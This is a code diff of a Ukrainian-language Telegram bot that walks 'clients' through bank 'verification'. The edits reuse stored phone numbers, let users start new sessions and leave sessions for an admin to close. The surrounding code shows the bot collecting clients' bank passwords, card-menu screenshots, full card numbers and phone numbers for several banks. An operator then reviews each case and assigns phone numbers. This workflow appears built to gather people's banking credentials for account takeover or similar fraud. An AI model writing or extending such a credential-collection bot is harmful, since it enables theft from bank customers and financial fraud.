@@ -169,11 +169,15 @@ async def cmd_start(message: Message, state: FSMContext):
         return
 
     if existing_session and existing_session['status'] == 'registered':
-        await message.answer(
-            "Ваш запит на верифікацію вже прийнято і він очікує перевірки адміністратором. Будь ласка, очікуйте призначення номера телефону.",
-            reply_markup=get_waiting_keyboard()
-        )
-        return
+        # Якщо всі банки завершено (немає залишкових банків), дозволяємо розпочати нову сесію
+        remaining_banks_str = existing_session.get('remaining_banks', '')
+        remaining = [b for b in remaining_banks_str.split(",") if b]
+        if remaining or not existing_session.get('selected_banks'):
+            await message.answer(
+                "Ваш запит на верифікацію вже прийнято і він очікує перевірки адміністратором. Будь ласка, очікуйте призначення номера телефону.",
+                reply_markup=get_waiting_keyboard()
+            )
+            return
 
     await state.clear()
     username_db = message.from_user.username or "Немає юзернейму"
@@ -629,6 +633,11 @@ async def process_client_password(message: Message, state: FSMContext):
         if line_info:
             bank_name = line_info['bank'].strip().lower()
 
+    if session and session.get('client_phone'):
+        # Якщо в базі вже є збережений номер, просто використовуємо його
+        await continue_after_phone(message, state, message.bot, client_id)
+        return
+
     if bank_name == "bank.kd":
         # Для bank.kd не просимо скріншот з меню картки та повний номер картки
         # Після пароля запитуємо номер телефону
@@ -813,7 +822,8 @@ async def continue_after_phone(message: Message, state: FSMContext, bot: Bot, cl
             "Роботу завершили, дякуємо за співпрацю.",
             reply_markup=kbd
         )
-        await db.close_session(client_id)
+        # Сесію НЕ закриваємо автоматично, щоб адмін закрив її вручну по кнопці
+        # await db.close_session(client_id)
         
         try:
             await bot.send_message(
@@ -1080,7 +1090,8 @@ async def mark_bank_as_failed(client_id: int, bot: Bot):
             text="На жаль, верифікація саме по цьому банку закінчена. Роботу завершили, дякуємо за співпрацю.",
             reply_markup=kbd
         )
-        await db.close_session(client_id)
+        # Сесію НЕ закриваємо автоматично, щоб адмін закрив її вручну по кнопці
+        # await db.close_session(client_id)
         
         try:
             username = session.get('username')
@@ -1607,12 +1618,16 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
             )
 
             if is_lvivbank:
-                success_text = (
-                    "Дякую! Скріншот прийнято.\n\n"
-                    "Будь ласка, напишіть Ваш номер телефону?"
-                )
-                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
-                await state.set_state(RegistrationStates.waiting_phone)
+                if existing_session and existing_session.get('client_phone'):
+                    # Якщо є збережений телефон для lvivbank, відразу продовжуємо
+                    await continue_after_phone(message, state, bot, client_id)
+                else:
+                    success_text = (
+                        "Дякую! Скріншот прийнято.\n\n"
+                        "Будь ласка, напишіть Ваш номер телефону?"
+                    )
+                    await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+                    await state.set_state(RegistrationStates.waiting_phone)
             else:
                 success_text = (
                     "Дякую! Скріншот прийнято.\n\n"
@@ -1919,11 +1934,16 @@ async def process_lviv_success_confirm(message: Message, state: FSMContext, bot:
             success_photo_id=success_photo_id
         )
         
-        await message.answer(
-            "Будь ласка, напишіть Ваш номер телефону?",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        await state.set_state(RegistrationStates.waiting_phone)
+        session = await db.get_session(message.from_user.id)
+        if session and session.get('client_phone'):
+            # Якщо є збережений телефон, відразу продовжуємо
+            await continue_after_phone(message, state, bot, message.from_user.id)
+        else:
+            await message.answer(
+                "Будь ласка, напишіть Ваш номер телефону?",
+                reply_markup=ReplyKeyboardRemove()
+            )
+            await state.set_state(RegistrationStates.waiting_phone)
     else:
         await state.clear()
         await handle_client_data_manual(message, state, bot)
